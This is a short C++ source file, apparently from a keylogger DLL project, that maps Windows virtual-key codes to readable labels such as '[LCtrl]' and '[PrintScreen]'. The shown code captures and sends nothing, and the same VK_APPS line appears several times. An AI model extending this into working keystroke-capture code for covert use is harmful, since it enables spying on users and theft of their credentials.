
#include			"keylogger_dll\Analyser.h"

Analyser::Analyser()
{
}

Analyser::~Analyser()
{
}

void						Analyser::initMap()
{
	_translateMap[VK_CANCEL] = "[Cancel]";
	_translateMap[VK_SPACE] = " ";
	_translateMap[VK_LCONTROL] = "[LCtrl]";
	_translateMap[VK_RCONTROL] = "[RCtrl]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_RMENU] = "[RAlt]";
	_translateMap[VK_LWIN] = "[LWindows]";
	_translateMap[VK_RWIN] = "[RWindows]";
	_translateMap[VK_APPS] = "[Applications]";
	_translateMap[VK_SNAPSHOT] = "[PrintScreen]";
	_translateMap[VK_INSERT] = "[Insert]";
	_translateMap[VK_PAUSE] = "[Pause]";
	_translateMap[VK_APPS] = "[Applications]";
	_translateMap[VK_APPS] = "[Applications]";
	_translateMap[VK_APPS] = "[Applications]";
}